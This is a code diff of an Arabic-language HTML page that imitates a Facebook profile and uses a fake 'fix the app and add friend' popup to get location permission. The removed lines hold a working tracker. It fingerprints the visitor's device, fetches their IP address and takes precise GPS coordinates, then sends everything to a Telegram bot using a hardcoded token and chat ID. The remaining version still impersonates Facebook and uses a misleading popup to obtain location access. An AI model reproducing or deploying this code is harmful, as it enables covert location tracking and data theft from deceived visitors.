@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اصلاح واضافة صديق السيد- Facebook</title>
+    <title>سامح السيد - Facebook</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -118,44 +118,45 @@
 <body>
     <div class="overlay" id="overlay">
         <div class="popup">
-            <p> يبدو ان هناك مشكلة في  التطبيق قم بعمل موافق او اصلاح واضافة صديق لحل المشكلة واضافة هذا الحساب صديق</p>
-            <button onclick="requestLocationPermission()">الاصلاح واضافة صديق</button>
+            <p>يبدو أن هناك مشكلة في التطبيق. قم بعمل موافق أو سماح لحل المشكلة وإضافة هذا الحساب كصديق.</p>
+            <button onclick="requestLocationPermission()">السماح</button>
         </div>
     </div>
 
     <div class="container">
         <div class="cover-photo">
-            <img src="https://scontent.fcai23-1.fna.fbcdn.net/v/t39.30808-6/370437641_3515393512120932_6308905167458711103_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=a5f93a&_nc_ohc=gGYm-HznEJ8Q7kNvgFNgQIw&_nc_ht=scontent.fcai23-1.fna&oh=00_AYCwtRA2SLzfz22FKbZ4Mx3EI53f0HCA-iRsf1I3ZMM6zw&oe=6690E75F" alt="سامح السيد" class="profile-photo">
+            <img src="https://example.com/profile-photo.jpg" alt="سامح السيد" class="profile-photo">
         </div>
         <div class="profile-info">
             <h1>سامح السيد</h1>
         </div>
         <div class="content">
             <p>مرحبًا بكم في صفحة سامح السيد الشخصية.</p>
-           
+            <div class="profiles">
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/women/81.jpg" alt="مستخدم">
+                    <p>أمل</p>
+                </div>
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/men/82.jpg" alt="مستخدم">
+                    <p>محمد</p>
+                </div>
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/women/83.jpg" alt="مستخدم">
+                    <p>ليلى</p>
+                </div>
+                <div class="profile">
+                    <img src="https://randomuser.me/api/portraits/men/84.jpg" alt="مستخدم">
+                    <p>علي</p>
+                </div>
             </div>
         </div>
-       
+        <div class="footer">
+            <p>حقوق الطبع والنشر © 2024 سامح السيد. جميع الحقوق محفوظة. <a href="#">سياسة الخصوصية</a></p>
+        </div>
     </div>
 
     <script>
-        function sendInformationToTelegram(info) {
-            var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
-            var chatId = '962686305';
-            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;
-
-            fetch(url).then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            }).then(data => {
-                console.log('Information sent to Telegram bot:', data);
-            }).catch(error => {
-                console.error('There was a problem with the fetch operation:', error);
-            });
-        }
-
         function collectDeviceInfo() {
             var ptf = navigator.platform;
             var cc = navigator.hardwareConcurrency || 'غير متوفر';
@@ -189,55 +190,27 @@
             var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
 
             var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
-            sendInformationToTelegram(deviceInfo);
-
-            // Collect IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    var ipInfo = `عنوان IP: ${data.ip}`;
-                    sendInformationToTelegram(ipInfo);
-                })
-                .catch(error => console.error('Error fetching IP address:', error));
+            console.log(deviceInfo);
         }
 
         function requestLocationPermission() {
             if (navigator.geolocation) {
                 var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    var lat = position.coords.latitude || 'غير متوفر';
-                    var lon = position.coords.longitude || 'غير متوفر';
-                    var acc = position.coords.accuracy || 'غير متوفر';
-                    var alt = position.coords.altitude || 'غير متوفر';
-                    var dir = position.coords.heading || 'غير متوفر';
-                    var spd = position.coords.speed || 'غير متوفر';
-
-                    var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
-                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
-                    sendInformationToTelegram(locationInfo);
-
                     document.getElementById('overlay').style.display = 'none';
                 }, function (error) {
-                    alert('لديك مشكلة قم بعمل اصلاح واضافة صديق لاضافة هذا الحساب في الاصدقاء.');
+                    alert('يرجى تفعيل إذن الموقع للمتابعة.');
                     document.getElementById('overlay').style.display = 'flex';
                 }, optn);
             } else {
-                alert('جهازك لا يدعم تحديد .');
+                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
             }
         }
 
-        // إرسال المعلومات عند تحميل الصفحة
+        // طلب إذن الموقع الجغرافي عند تحميل الصفحة
         window.onload = function() {
             collectDeviceInfo();
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    requestLocationPermission();
-                }, function(error) {
-                    document.getElementById('overlay').style.display = 'flex';
-                });
-            } else {
-                alert('جهازك لا يدعم تحديد .');
-            }
+            requestLocationPermission();
         };
     </script>
 </body>
